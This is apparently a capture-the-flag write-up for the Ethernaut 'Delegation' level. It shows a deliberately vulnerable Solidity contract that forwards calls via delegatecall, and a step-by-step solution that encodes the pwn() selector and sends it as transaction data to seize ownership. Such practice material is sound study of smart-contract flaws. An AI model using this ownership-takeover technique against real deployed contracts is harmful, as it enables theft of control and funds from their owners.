# Delegation Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

# Solution
This solution envolves taking advantage of delegatecall and the fallback function. The key to this solution is knowing that you can pass functions as data and run them in other contracts.
Delegatecall will call functions as the contract in which the delegatecall was invoked. In this case, we want to get the fallback function in Delagation to call the pwn() function because in doing so, we can send the pwn() function with us as the sender.

In Remix, we add the following:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GetPwnSignature{
    function getSig() public pure returns (bytes memory) {
        return abi.encodeWithSignature("pwn()");
    }
}
```

When we run this code we will get a value of  0xdd365b8b.

Now, we can go back to ethernaut and run:
> await contract.sendTransaction({data: '0xdd365b8b'})

# What I learned
1. Careful when using delegatecall and always know what other contracts you are using are doing
2. Getting encoded signatures in solidity
